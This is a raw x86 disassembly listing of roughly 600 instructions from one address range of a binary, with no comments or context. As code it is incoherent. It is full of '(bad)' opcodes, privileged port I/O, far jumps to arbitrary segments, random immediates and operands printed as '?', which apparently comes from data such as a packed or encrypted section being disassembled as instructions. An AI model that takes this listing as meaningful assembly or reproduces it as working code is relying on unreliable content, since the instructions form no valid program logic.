  40be11:	xor    BYTE PTR [edx+eiz*4+0x493205c6],ch
  40be18:	nop
  40be19:	sahf   
  40be1a:	pop    es
  40be1b:	rcr    bl,1
  40be1d:	gs mov dh,0x8f
  40be20:	inc    edi
  40be21:	loopne 0x40be2a
  40be23:	(bad)  
  40be24:	or     bl,cl
  40be26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be27:	shl    DWORD PTR [eax-0x19],1
  40be2a:	jne    0x40be76
  40be2c:	and    bh,0xee
  40be2f:	add    BYTE PTR [ebx-0x73],bl
  40be32:	mov    ds:0xda3a8426,eax
  40be37:	mov    esp,0xde6f1a67
  40be3c:	jl     0x40be2b
  40be3e:	fbld   TBYTE PTR [eax]
  40be40:	mov    ds:0xf2b202c5,al
  40be45:	mov    ah,BYTE PTR ds:0xc44b9ec5
  40be4b:	jg     0x40be16
  40be4d:	loop   0x40beb8
  40be4f:	push   ecx
  40be50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be52:	mov    ds:0xe7faafec,al
  40be57:	lea    ebx,[edi]
  40be59:	in     al,0x24
  40be5b:	and    al,0xef
  40be5d:	out    dx,eax
  40be5e:	jne    0x40bed1
  40be60:	sbb    BYTE PTR [ebx-0x13],dl
  40be63:	cld    
  40be64:	inc    edi
  40be65:	pushf  
  40be66:	mov    edx,0xe1c39591
  40be6b:	or     dh,0x2c
  40be6e:	(bad)  [ecx]
  40be70:	into   
  40be71:	dec    eax
  40be72:	fcomi  st,st(6)
  40be74:	rol    ecx,1
  40be76:	mov    esi,0xc0cf5c2c
  40be7b:	cmp    cl,BYTE PTR [ecx-0x2046f14f]
  40be81:	lds    ecx,FWORD PTR [ebx-0x6f33aec2]
  40be87:	std    
  40be88:	shl    DWORD PTR [edi],1
  40be8a:	inc    esi
  40be8b:	xlat   BYTE PTR ds:[ebx]
  40be8c:	inc    edx
  40be8d:	dec    DWORD PTR [eax+0x15]
  40be90:	lea    ebx,[esi-0x2e]
  40be93:	or     dh,BYTE PTR [esi-0x75]
  40be96:	arpl   WORD PTR [eax-0x73],dx
  40be99:	scas   eax,DWORD PTR es:[edi]
  40be9a:	push   ss
  40be9b:	mov    dl,0x6e
  40be9d:	adc    BYTE PTR ds:0x9be51622,ah
  40bea3:	push   cs
  40bea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bea5:	es add eax,0x6ecec614
  40beab:	or     DWORD PTR ds:0xdb36cfc5,esi
  40beb1:	rcl    ebp,1
  40beb3:	jns    0x40bf29
  40beb5:	stos   BYTE PTR es:[edi],al
  40beb6:	inc    edi
  40beb7:	rol    BYTE PTR [edx+0x53],0x8e
  40bebb:	xchg   edi,eax
  40bebc:	cli    
  40bebd:	rcr    bl,cl
  40bebf:	(bad)  
  40bec1:	ret    
  40bec2:	(bad)  
  40bec3:	lds    ecx,FWORD PTR [edx-0x75]
  40bec6:	jle    0x40beba
  40bec8:	cld    
  40bec9:	in     al,dx
  40beca:	dec    edi
  40becb:	mov    ds:0x856bb405,al
  40bed0:	mul    BYTE PTR [ebp-0x7]
  40bed3:	into   
  40bed4:	xchg   ecx,eax
  40bed5:	sbb    cl,0x6a
  40bed8:	leave  
  40bed9:	shr    DWORD PTR [edi-0xbc06c6c],cl
  40bedf:	fwait
  40bee0:	inc    eax
  40bee1:	jne    0x40bea0
  40bee3:	xchg   esi,eax
  40bee4:	inc    eax
  40bee5:	jbe    0x40bf17
  40bee7:	push   ebp
  40bee8:	pop    ds
  40bee9:	mov    edx,0x37bfb322
  40beee:	fnstenv [ecx-0x7f]
  40bef1:	sbb    edx,edx
  40bef3:	sti    
  40bef4:	sub    ecx,ebp
  40bef6:	in     eax,0x4f
  40bef8:	leave  
  40bef9:	sub    eax,0xaef2a3d0
  40befe:	and    al,ch
  40bf00:	adc    dh,0x9d
  40bf03:	je     0x40bf7e
  40bf05:	xor    dl,BYTE PTR [esi+0x5d]
  40bf08:	lahf   
  40bf09:	mov    edi,0xd0440a07
  40bf0e:	retf   
  40bf0f:	fdivr  DWORD PTR [esi-0x6e]
  40bf12:	and    eax,0x80d48f96
  40bf17:	pushf  
  40bf18:	call   0x9f17:0x811f50e7
  40bf1f:	out    0xc0,al
  40bf21:	js     0x40bf34
  40bf23:	(bad)  
  40bf24:	jo     0x40befc
  40bf26:	cmp    DWORD PTR [ecx+esi*2-0x75c7078d],edi
  40bf2d:	mov    ah,0xb4
  40bf2f:	sub    eax,0x2afac8c0
  40bf34:	fstp   DWORD PTR [edi]
  40bf36:	jge    0x40bf37
  40bf38:	add    eax,ebx
  40bf3a:	cvtdq2ps xmm6,XMMWORD PTR [edi]
  40bf3d:	retf   0x7603
  40bf40:	cmp    esi,esi
  40bf42:	out    0x6d,al
  40bf44:	dec    esp
  40bf45:	lahf   
  40bf46:	inc    esi
  40bf47:	retf   0xebaa
  40bf4a:	and    esp,edx
  40bf4c:	adc    cl,ah
  40bf4e:	loopne 0x40bf24
  40bf50:	and    DWORD PTR [ebx-0x11d1738d],ebx
  40bf56:	jbe    0x40bfd2
  40bf58:	mov    esi,ebx
  40bf5a:	mov    ?,ebx
  40bf5c:	add    BYTE PTR [ebx],bl
  40bf5e:	inc    ecx
  40bf5f:	mov    al,ds:0xa382645
  40bf64:	lock inc ebp
  40bf66:	gs push edx
  40bf68:	cmc    
  40bf69:	sbb    ch,BYTE PTR [edi-0xe]
  40bf6c:	ins    DWORD PTR es:[edi],dx
  40bf6d:	aaa    
  40bf6e:	aas    
  40bf6f:	dec    esi
  40bf70:	sub    eax,0x42173769
  40bf75:	xchg   esi,eax
  40bf76:	push   ecx
  40bf77:	jae    0x40bfb5
  40bf79:	inc    ebx
  40bf7a:	scas   al,BYTE PTR es:[edi]
  40bf7b:	cmc    
  40bf7c:	push   ecx
  40bf7d:	inc    ecx
  40bf7e:	imul   esp,DWORD PTR [esi],0x0
  40bf81:	cmp    ch,bh
  40bf83:	mov    ah,0xfa
  40bf85:	sub    bh,BYTE PTR [esi]
  40bf87:	outs   dx,DWORD PTR ds:[esi]
  40bf88:	xchg   esi,eax
  40bf89:	(bad)  
  40bf8b:	(bad)  
  40bf8c:	retf   
  40bf8d:	cmp    ecx,DWORD PTR [edx+0x57252633]
  40bf93:	scas   eax,DWORD PTR es:[edi]
  40bf94:	rcr    BYTE PTR [esi],1
  40bf96:	jmp    0x8216:0x69d0f077
  40bf9d:	out    dx,eax
  40bf9e:	mov    bl,0xb
  40bfa0:	mov    ah,0x86
  40bfa2:	sbb    BYTE PTR [edi],cl
  40bfa4:	cmp    esi,DWORD PTR [eax+eax*2-0x298a76e0]
  40bfab:	pop    ds
  40bfac:	push   0xc0fcbda1
  40bfb1:	data16 jl 0x40bfbd
  40bfb4:	outs   dx,DWORD PTR ds:[esi]
  40bfb5:	(bad)  
  40bfb6:	repnz adc eax,0xd564c2ee
  40bfbc:	cmp    ebx,DWORD PTR [ebp-0xb]
  40bfbf:	stos   DWORD PTR es:[edi],eax
  40bfc0:	retf   
  40bfc1:	fimul  WORD PTR [ebx+0x9]
  40bfc4:	ret    0x3167
  40bfc7:	mov    bh,0xaa
  40bfca:	sbb    eax,0xc078763e
  40bfcf:	mov    edi,ebx
  40bfd1:	dec    esi
  40bfd2:	loope  0x40bfb8
  40bfd4:	shr    DWORD PTR [ebp+0x7ea52382],0x49
  40bfdb:	ret    
  40bfdc:	loop   0x40bf64
  40bfde:	sbb    esi,0x71
  40bfe1:	mov    cl,0x9b
  40bfe3:	(bad)  
  40bfe4:	cwde   
  40bfe5:	call   0x103dd0a4
  40bfea:	pop    ds
  40bfeb:	mov    ds:0xc837eb1,al
  40bff0:	ja     0x40c03b
  40bff2:	ins    BYTE PTR es:[edi],dx
  40bff3:	dec    esi
  40bff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bff5:	pop    esp
  40bff6:	push   edx
  40bff7:	mov    dl,0x2d
  40bff9:	inc    ebp
  40bffa:	outs   dx,BYTE PTR ds:[esi]
  40bffb:	mov    edx,0x97139571
  40c000:	(bad)  
  40c001:	and    al,0x10
  40c003:	jne    0x40bfaf
  40c005:	sub    DWORD PTR [ebx],0x56c73aa6
  40c00b:	test   eax,0x2c10876a
  40c010:	dec    esp
  40c011:	inc    esp
  40c012:	mov    ecx,0x5eb3c03e
  40c017:	jnp    0x40c00e
  40c019:	sbb    DWORD PTR [esi-0xb1d738a],ebx
  40c01f:	mov    ?,WORD PTR [ecx+0x45895e80]
  40c025:	mov    dh,0x89
  40c027:	pop    esp
  40c028:	lods   al,BYTE PTR ds:[esi]
  40c029:	mov    al,0xf7
  40c02b:	test   DWORD PTR [ecx],eax
  40c02d:	in     eax,dx
  40c02e:	ficomp WORD PTR [esi-0x74]
  40c031:	or     al,0xe4
  40c033:	push   esp
  40c034:	jbe    0x40c014
  40c036:	test   BYTE PTR [edi+ebp*8],ah
  40c039:	test   esi,eax
  40c03b:	pop    edx
  40c03c:	add    dl,cl
  40c03e:	in     al,dx
  40c03f:	iret   
  40c040:	push   esp
  40c041:	cmp    al,0xc8
  40c043:	test   esp,ecx
  40c045:	mov    ebp,0xb24421a0
  40c04a:	mov    al,ds:0xa6fa3aca
  40c04f:	(bad)  
  40c050:	fsub   QWORD PTR [eax-0x46dd3e4c]
  40c056:	(bad)  [ebx]
  40c058:	and    ebx,DWORD PTR [edx-0x3b43e37]
  40c05e:	sub    esi,DWORD PTR [esi-0x33e6dc5d]
  40c064:	pop    ds
  40c065:	lea    edi,[ebx+0x65cefe17]
  40c06b:	call   0xf75765b0
  40c070:	or     ebx,DWORD PTR [ebp-0x18]
  40c073:	mov    bl,BYTE PTR [eax-0xc]
  40c076:	scas   eax,DWORD PTR es:[edi]
  40c077:	into   
  40c078:	mov    cl,0xe4
  40c07a:	pop    esi
  40c07b:	sub    ecx,DWORD PTR [ebx-0x46fc1d4b]
  40c081:	jmp    0x1d1f:0x5f04380
  40c088:	cli    
  40c089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c08a:	ins    DWORD PTR es:[edi],dx
  40c08b:	inc    edi
  40c08c:	leave  
  40c08d:	pop    edi
  40c08e:	lock mov ah,0x8d
  40c091:	inc    esp
  40c092:	jno    0x40c05d
  40c094:	in     eax,dx
  40c095:	adc    edx,DWORD PTR [esi-0x322457cb]
  40c09b:	cli    
  40c09c:	sti    
  40c09d:	lods   al,BYTE PTR ds:[esi]
  40c09e:	pop    ebp
  40c09f:	mov    ds:0x3712cc76,eax
  40c0a4:	and    BYTE PTR [ecx+esi*4+0x68],cl
  40c0a8:	shl    dh,cl
  40c0aa:	hlt    
  40c0ab:	out    dx,al
  40c0ac:	shl    BYTE PTR [eax+0x71],cl
  40c0af:	xchg   edi,eax
  40c0b0:	ficomp WORD PTR [edi]
  40c0b2:	pause  
  40c0b4:	xchg   esp,eax
  40c0b5:	fcom   DWORD PTR [esi+0x143eb270]
  40c0bb:	mov    dh,0x4a
  40c0bd:	ret    
  40c0be:	sar    BYTE PTR [ecx-0x4e],0x4
  40c0c2:	or     al,0x7d
  40c0c4:	mov    cl,0x32
  40c0c6:	dec    eax
  40c0c7:	in     al,0xb5
  40c0c9:	push   esi
  40c0ca:	nop
  40c0cb:	pop    ss
  40c0cc:	push   0xf3b5b002
  40c0d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0d2:	(bad)  
  40c0d3:	jle    0x40c151
  40c0d5:	ja     0x40c114
  40c0d7:	movaps xmm5,xmm1
  40c0da:	(bad)  [eax]
  40c0dc:	mov    edi,0xed5e9ae4
  40c0e1:	ins    DWORD PTR es:[edi],dx
  40c0e2:	jp     0x40c12a
  40c0e4:	jns    0x40c0e1
  40c0e6:	stos   BYTE PTR es:[edi],al
  40c0e7:	aad    0x7
  40c0e9:	xor    BYTE PTR es:[edx+eax*8],ch
  40c0ed:	jae    0x40c0d4
  40c0ef:	in     al,dx
  40c0f0:	cmc    
  40c0f1:	jo     0x40c137
  40c0f3:	rol    BYTE PTR [edi-0x12],0x7a
  40c0f7:	mov    eax,0x80b6f1d6
  40c0fc:	lds    edi,FWORD PTR [esi+0xb]
  40c0ff:	fsubr  st,st(7)
  40c101:	cmp    BYTE PTR [edi-0x7e4f965],0x3b
  40c108:	jne    0x40c096
  40c10a:	int3   
  40c10b:	adc    DWORD PTR [ecx-0x52],esi
  40c10e:	mov    edi,0x1d0e728
  40c113:	and    DWORD PTR [ecx],edi
  40c115:	cmp    ah,BYTE PTR [ecx]
  40c117:	sbb    eax,0x11db5631
  40c11c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c11d:	scas   al,BYTE PTR es:[edi]
  40c11e:	sub    BYTE PTR [esp+eax*1],bh
  40c121:	rol    BYTE PTR [edx],cl
  40c123:	mov    esi,0xb0c18907
  40c128:	out    dx,eax
  40c129:	daa    
  40c12a:	(bad)  
  40c12c:	pop    esp
  40c12d:	jnp    0x40c0f3
  40c12f:	xchg   ebx,eax
  40c130:	add    DWORD PTR [eax],edi
  40c132:	bndldx bnd2,[edx+0x4c]
  40c136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c138:	pop    ebx
  40c139:	(bad)  
  40c13a:	stos   DWORD PTR es:[edi],eax
  40c13b:	sti    
  40c13c:	cmp    eax,0x7810099
  40c141:	call   0xc97fe5f8
  40c146:	push   0x814d7b79
  40c14b:	bound  ecx,QWORD PTR [edx+0x6c]
  40c14e:	jne    0x40c174
  40c150:	xchg   edx,eax
  40c151:	add    edi,ebp
  40c153:	jecxz  0x40c0d6
  40c155:	scas   eax,DWORD PTR es:[edi]
  40c156:	xchg   ebx,eax
  40c157:	push   ebp
  40c158:	pop    ss
  40c159:	jmp    0x7dd1a758
  40c15e:	push   ds
  40c15f:	add    BYTE PTR [esi*4-0x470cda1e],dh
  40c166:	mov    edx,0x21181815
  40c16b:	dec    BYTE PTR [eax+0x6f]
  40c16e:	mov    ah,0x71
  40c170:	or     ah,BYTE PTR [edi-0x423c2379]
  40c176:	mov    ch,0x8a
  40c178:	mov    DWORD PTR [eax+0x3b],edx
  40c17b:	addr16 dec eax
  40c17d:	sub    ecx,DWORD PTR [ecx]
  40c17f:	nop
  40c180:	inc    edx
  40c181:	clc    
  40c182:	cdq    
  40c183:	ja     0x40c108
  40c185:	in     eax,dx
  40c186:	inc    ebx
  40c187:	xchg   ebx,eax
  40c188:	mov    bh,BYTE PTR [ebx]
  40c18a:	stc    
  40c18b:	jbe    0x40c20b
  40c18d:	mov    ah,0xe7
  40c18f:	or     DWORD PTR [edx],ebp
  40c191:	add    al,0x77
  40c193:	mov    ds:0x7f46196c,eax
  40c198:	mov    WORD PTR [esi-0x51],ss
  40c19b:	test   BYTE PTR [edi+ebx*1],bh
  40c19e:	in     al,0xe3
  40c1a0:	pop    eax
  40c1a1:	sbb    dh,BYTE PTR [edi+0x4c]
  40c1a4:	dec    eax
  40c1a5:	aaa    
  40c1a6:	mov    ds:0x3417c65a,eax
  40c1ab:	pop    ebp
  40c1ac:	xchg   ebx,eax
  40c1ae:	shr    BYTE PTR [edi-0x648c2ee7],0xd7
  40c1b5:	sub    dl,al
  40c1b7:	cli    
  40c1b8:	push   es
  40c1b9:	addr16 ror dh,cl
  40c1bc:	hlt    
  40c1bd:	fstp   DWORD PTR [edi-0x2d]
  40c1c0:	fadd   DWORD PTR [esi-0x600be29a]
  40c1c6:	cdq    
  40c1c7:	jo     0x40c1d6
  40c1c9:	jno    0x40c217
  40c1cb:	cdq    
  40c1cc:	(bad)  
  40c1cd:	mov    cl,0x84
  40c1cf:	cli    
  40c1d0:	stos   DWORD PTR es:[edi],eax
  40c1d1:	dec    eax
  40c1d2:	pop    esi
  40c1d3:	cld    
  40c1d4:	xchg   BYTE PTR [edx-0x2e],ah
  40c1d7:	or     eax,0xb383e582
  40c1dc:	and    al,0xf
  40c1de:	icebp  
  40c1df:	mov    ch,0xdc
  40c1e1:	sbb    eax,0xd20d99b9
  40c1e6:	xchg   ecx,ebx
  40c1e8:	xor    dh,BYTE PTR [edx+0x12251167]
  40c1ee:	or     al,0x3f
  40c1f0:	daa    
  40c1f1:	stos   BYTE PTR es:[edi],al
  40c1f2:	fisubr WORD PTR [ebx+0x3cddc667]
  40c1f8:	xchg   esp,eax
  40c1f9:	xchg   edi,eax
  40c1fa:	inc    ebp
  40c1fb:	leave  
  40c1fc:	sub    al,0xf5
  40c1fe:	push   ebx
  40c1ff:	sub    esp,ebx
  40c201:	sub    al,0x79
  40c203:	jae    0x40c1ed
  40c205:	icebp  
  40c206:	sbb    BYTE PTR [edi+0xa],dl
  40c209:	jge    0x40c22b
  40c20b:	jbe    0x40c1b1
  40c20d:	jne    0x40c25a
  40c20f:	push   cs
  40c210:	mov    esi,0x8df58385
  40c215:	cs cmp edx,0x2429d773
  40c21c:	iret   
  40c21d:	or     al,0x2
  40c21f:	or     al,0x71
  40c221:	pop    esi
  40c222:	cmp    eax,0xba2b4d09
  40c227:	sub    DWORD PTR [ecx+ebp*4],0xffffffce
  40c22b:	push   0x4c
  40c22d:	sub    ebp,DWORD PTR [ebx]
  40c22f:	mov    ebx,0x6f78a2f0
  40c234:	sub    eax,0xc36f4ed6
  40c239:	inc    ebx
  40c23a:	in     al,0xac
  40c23c:	je     0x40c2a4
  40c23e:	add    al,0x36
  40c240:	cmp    eax,0x166bc51a
  40c245:	or     DWORD PTR gs:[edx+0x6c19fb78],eax
  40c24c:	sub    dl,dh
  40c24e:	sbb    ebp,DWORD PTR [edx-0x2f6413ff]
  40c254:	sub    eax,0x2e157e4e
  40c259:	retf   
  40c25a:	xchg   ebx,eax
  40c25b:	sbb    al,0xa9
  40c25d:	xchg   ecx,eax
  40c25e:	out    dx,al
  40c25f:	sub    DWORD PTR [edx],esi
  40c261:	mov    bh,0xdf
  40c263:	mov    ds:0x4b83bd8b,eax
  40c268:	lahf   
  40c269:	push   ebp
  40c26a:	sbb    bl,ch
  40c26c:	leave  
  40c26d:	scas   al,BYTE PTR es:[edi]
  40c26e:	sub    dh,0xdb
  40c271:	(bad)  [ebx-0x51]
  40c274:	or     bh,dh
  40c276:	xchg   ebp,eax
  40c277:	and    bh,dh
  40c279:	push   esi
  40c27a:	jmp    0x754:0x2692bb68
  40c281:	jmp    0x40c2f0
  40c283:	adc    BYTE PTR [edx],bh
  40c285:	cmc    
  40c286:	pop    ebx
  40c287:	add    cl,BYTE PTR [esi-0x1a0bdf6a]
  40c28d:	lods   eax,DWORD PTR ds:[esi]
  40c28e:	mov    esi,0x285a0fa5
  40c293:	std    
  40c294:	jns    0x40c2dd
  40c296:	push   ds
  40c297:	xchg   edx,eax
  40c298:	xor    bl,BYTE PTR ds:0x278e054a
  40c29e:	xchg   edx,eax
  40c29f:	dec    edx
  40c2a0:	lahf   
  40c2a1:	imul   edx,DWORD PTR [ecx+0x6ed1c2fd],0x1fbc7ad2
  40c2ab:	scas   al,BYTE PTR es:[edi]
  40c2ac:	sbb    BYTE PTR [esi+0x235515b3],0x8d
  40c2b3:	cmp    ax,0x51f9
  40c2b7:	jg     0x40c273
  40c2b9:	adc    DWORD PTR ds:0xde0dc5a7,0xffffff81
  40c2c0:	or     eax,0x75e45ca6
  40c2c5:	sbb    cl,BYTE PTR [edx+edx*1]
  40c2c8:	mov    al,ds:0x7b6bb489
  40c2cd:	out    dx,eax
  40c2ce:	lahf   
  40c2cf:	mov    al,ds:0x63d0fd1b
  40c2d4:	jbe    0x40c311
  40c2d6:	push   DWORD PTR [ecx-0x5d02c102]
  40c2dc:	sub    bh,BYTE PTR [ebx-0x4f296d98]
  40c2e2:	fs out 0xb8,al
  40c2e5:	pop    esi
  40c2e6:	out    0x34,eax
  40c2e8:	xchg   esp,eax
  40c2e9:	xchg   dh,al
  40c2eb:	test   eax,0x2b95a7a5
  40c2f0:	dec    esp
  40c2f1:	push   esi
  40c2f2:	mov    edx,0x98dbc78a
  40c2f7:	fcomp  st(6)
  40c2f9:	dec    esi
  40c2fa:	stc    
  40c2fb:	mov    edi,esi
  40c2fd:	rcr    BYTE PTR [ebp+0x10],1
  40c300:	aas    
  40c301:	out    dx,eax
  40c302:	lahf   
  40c303:	push   0x53
  40c305:	adc    DWORD PTR [esi+0x3eb5ca7f],edi
  40c30b:	mov    esp,?
  40c30d:	cmp    eax,0xf4d64f75
  40c312:	mov    bl,0xea
  40c314:	dec    eax
  40c315:	xchg   ebx,eax
  40c316:	fwait
  40c317:	in     eax,dx
  40c318:	dec    edi
  40c319:	sbb    edi,DWORD PTR [ebx]
  40c31b:	shr    ebp,cl
  40c31d:	int3   
  40c31e:	js     0x40c2ad
  40c320:	ret    
  40c321:	push   ecx
  40c322:	xchg   esp,eax
  40c323:	(bad)  
  40c324:	push   cs
  40c325:	in     eax,0x5d
  40c327:	(bad)  
  40c328:	xchg   esp,eax
  40c329:	xchg   ecx,eax
  40c32a:	loope  0x40c354
  40c32c:	push   esi
  40c32d:	arpl   sp,dx
  40c32f:	and    al,0x28
  40c331:	lds    edx,FWORD PTR [esi+0x17]
  40c334:	or     eax,edx
  40c336:	retf   0xeed8
  40c339:	imul   esi,DWORD PTR [ebx-0x3d],0x9e2b27c9
  40c340:	mov    bh,0x83
  40c342:	inc    edi
  40c343:	dec    ebx
  40c344:	xlat   BYTE PTR ds:[ebx]
  40c345:	sar    BYTE PTR [edi+0x167b7b20],0x85
  40c34c:	retf   0xcbda
  40c34f:	xchg   BYTE PTR [edx-0x4fafa5be],dh
  40c355:	and    DWORD PTR [ecx],eax
  40c357:	popa   
  40c358:	in     eax,dx
  40c359:	ret    
  40c35a:	push   es
  40c35b:	xchg   edx,eax
  40c35c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c35d:	xchg   esi,eax
  40c35e:	loopne 0x40c395
  40c360:	sub    eax,0x7cdbac0c
  40c365:	shr    BYTE PTR ds:0xa6b9192d,cl
  40c36b:	fild   QWORD PTR [esi-0x7a2672b3]
  40c371:	pop    ecx
  40c372:	jle    0x40c2f7
  40c374:	pop    eax
  40c375:	in     eax,dx
  40c376:	cmp    eax,0x878834dc
  40c37b:	mov    edx,0x26cd6cde
  40c380:	retf   0x42a0
  40c383:	inc    ebx
  40c384:	rcr    DWORD PTR [ecx+0x6386dc51],0x27
  40c38b:	mov    esp,0x67bcaa1
  40c390:	xor    dl,BYTE PTR [edx+0x30]
  40c393:	fisubr WORD PTR [esi+eax*8-0x47]
  40c397:	pop    ecx
  40c398:	imul   esi,DWORD PTR [edi],0x68
  40c39b:	pop    ebx
  40c39c:	pop    ds
  40c39d:	pop    esp
  40c39e:	loopne 0x40c3bd
  40c3a0:	inc    edi
  40c3a1:	add    bh,BYTE PTR ds:0x817b542
  40c3a7:	test   DWORD PTR [esi-0x5c820727],esi
  40c3ad:	cmp    DWORD PTR [ebp+esi*2-0x16],esi
  40c3b1:	inc    ebp
  40c3b2:	add    DWORD PTR [ebp+0x6ebe38a8],edi
  40c3b8:	nop
  40c3b9:	ror    DWORD PTR [ebx],0x1a
  40c3bc:	xchg   edi,eax
  40c3bd:	mov    ebp,0xe1b86dff
  40c3c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3c3:	imul   edi,DWORD PTR [ebp-0x2d],0x60649111
  40c3ca:	stos   DWORD PTR es:[edi],eax
  40c3cb:	jnp    0x40c42b
  40c3cd:	arpl   ax,di
  40c3cf:	add    cl,dh
  40c3d1:	jecxz  0x40c390
  40c3d3:	(bad)  
  40c3d4:	shr    DWORD PTR [esi+0x65],cl
  40c3d7:	jns    0x40c404
  40c3d9:	popf   
  40c3da:	mov    eax,0x424b566b
  40c3df:	idiv   DWORD PTR [eax-0x17]
  40c3e2:	mov    ds:0x67d6aded,eax
  40c3e7:	xchg   ecx,eax
  40c3e8:	mov    cl,0x41
  40c3ea:	mov    al,ds:0x61bfe901
  40c3ef:	dec    edx
  40c3f0:	pop    esp
  40c3f1:	outs   dx,BYTE PTR ds:[esi]
  40c3f2:	ins    BYTE PTR es:[edi],dx
  40c3f3:	cdq    
  40c3f4:	call   0xd9454c3c
  40c3f9:	inc    edi
  40c3fa:	imul   ebx,DWORD PTR [ebp-0x64145447],0x444d1c16
  40c404:	mov    eax,ds:0xf47db639
  40c409:	fistp  DWORD PTR [edx]
  40c40b:	dec    BYTE PTR [ebx+0x62948f2a]
  40c411:	mov    dh,0xb8
  40c413:	je     0x40c48d
  40c415:	jmp    0x2067:0xb65acc44
  40c41c:	mov    ecx,0x616fb26e
  40c421:	cld    
  40c422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c423:	mov    esi,0xd5d32c9
  40c428:	or     BYTE PTR [edi],ah
  40c42a:	std    
  40c42b:	pop    es
  40c42c:	or     DWORD PTR [ebp-0x45989baa],ebp
  40c432:	xor    BYTE PTR [esi-0x420330fa],dl
  40c438:	or     eax,0xb74e798c
  40c43d:	ja     0x40c3d7
  40c43f:	ins    BYTE PTR es:[edi],dx
  40c440:	dec    edi
  40c441:	call   0x6e22:0xd40b29df
  40c448:	pmaxub mm1,QWORD PTR [edx-0x47]
  40c44c:	addr16 test eax,0x7f3c45e2
  40c452:	loope  0x40c48f
  40c454:	add    BYTE PTR [esi-0x6],dl
  40c457:	inc    ebp
  40c458:	push   edx
  40c459:	dec    ecx
  40c45a:	mov    ebp,0xc5277266
  40c45f:	jnp    0x40c404
  40c461:	add    ecx,DWORD PTR [edx-0x1a]
  40c464:	mov    cl,0x91
  40c466:	push   0x71dfa138
  40c46b:	xchg   ebp,eax
  40c46c:	fucomp st(0)
  40c46e:	outs   dx,BYTE PTR ds:[esi]
  40c46f:	adc    esp,esp
  40c471:	out    0x15,al
  40c473:	in     eax,dx
  40c474:	stos   BYTE PTR es:[edi],al
  40c475:	mov    WORD PTR [esi-0x17],fs
  40c478:	aad    0xc9
  40c47a:	out    0x48,al
  40c47c:	jae    0x40c4e1
  40c47e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c47f:	push   edi
  40c480:	sub    BYTE PTR [eax+0x2e],cl
  40c483:	popf   
  40c484:	shr    DWORD PTR ds:[ebp-0x3cd92ca9],1
  40c48b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c48c:	inc    edi
  40c48d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c48e:	aaa    
  40c48f:	pop    edx
  40c490:	mov    eax,0x4cb0cb56
  40c495:	mov    bl,0x11
  40c497:	aas    
  40c498:	adc    eax,0x5db0c8de
  40c49d:	xchg   ecx,eax
  40c49e:	pop    edx
  40c49f:	sbb    eax,0xc9338bc6
  40c4a4:	mov    DWORD PTR [ebx-0x73],ecx
  40c4a7:	in     eax,dx
  40c4a8:	mov    WORD PTR [ebx+edx*2],?
  40c4ab:	add    edx,ecx
  40c4ad:	mov    ebx,0xb3fa4c4e
  40c4b2:	jg     0x40c4b7
  40c4b4:	jg     0x40c46b
  40c4b6:	mov    eax,ds:0xe7a8e89b
  40c4bb:	(bad)
  40c4be:	xchg   esi,eax
  40c4bf:	repz out 0x4c,al
  40c4c2:	ins    BYTE PTR es:[edi],dx
  40c4c3:	mov    ebx,0xb5489b60
  40c4c8:	jg     0x40c4c1
  40c4ca:	push   ebp
  40c4cb:	and    DWORD PTR [ebx+0x6ff4dd10],ecx
  40c4d1:	pop    es
  40c4d2:	addr16 (bad) 
  40c4d5:	xor    dh,dl
  40c4d7:	jmp    0x98f5:0xc15de84b
  40c4de:	push   0xffffffea
  40c4e0:	or     BYTE PTR [edi],cl
  40c4e2:	pushf  
  40c4e3:	sub    DWORD PTR [ebx+0x5a],esp
  40c4e6:	mov    ecx,0x7c9fe3e6
  40c4eb:	xchg   ebp,eax
  40c4ec:	pop    es
  40c4ed:	mov    DWORD PTR [edx],edx
  40c4ef:	adc    eax,0x9b77c07a
  40c4f4:	push   ss
  40c4f5:	inc    edi
  40c4f6:	nop
  40c4f7:	dec    ebx
  40c4f8:	int    0x64
  40c4fa:	dec    esi
  40c4fb:	js     0x40c54d
  40c4fd:	fldenv [ecx-0x24e80222]
  40c503:	mov    bh,0x4a
  40c505:	pop    eax
  40c506:	mov    ecx,DWORD PTR es:[esi+0x76]
  40c50a:	scas   eax,DWORD PTR es:[edi]
  40c50b:	mov    al,ds:0xc2da4f39
  40c510:	xor    BYTE PTR [edx],0xab
  40c513:	in     al,0x8b
  40c515:	mov    WORD PTR [edi+0x67],?
  40c518:	popa   
  40c519:	cmp    DWORD PTR [esi],ebp
  40c51b:	jmp    0x40c50e
  40c51d:	cmp    BYTE PTR [edx+eiz*4-0x3],bl
  40c521:	sub    ch,BYTE PTR [ebx+ebp*2-0x1a648a17]
  40c528:	xor    ebp,DWORD PTR [eax]
  40c52a:	fs in  eax,0x2c
  40c52d:	inc    esi
  40c52e:	mov    ebx,0xd356938
  40c533:	or     DWORD PTR [ebx+0x41f3b639],ebp
  40c539:	fstp   QWORD PTR ss:[ebx-0x36]
  40c53d:	jb     0x40c50e
  40c53f:	icebp  
  40c540:	pushf  
  40c541:	sbb    ecx,0x8afc0a82
  40c547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c548:	push   esi
  40c549:	idiv   BYTE PTR [esi+0x424eb2e3]
  40c54f:	(bad)  
  40c550:	popa   
  40c551:	leave  
  40c552:	xor    BYTE PTR [ecx-0x5dccdd65],cl
  40c558:	pop    es
  40c559:	repnz cmp cl,BYTE PTR fs:[edi-0x1f]
  40c55e:	retf   
  40c55f:	xchg   si,ax
  40c561:	cmp    ebx,DWORD PTR [edx-0x2c]
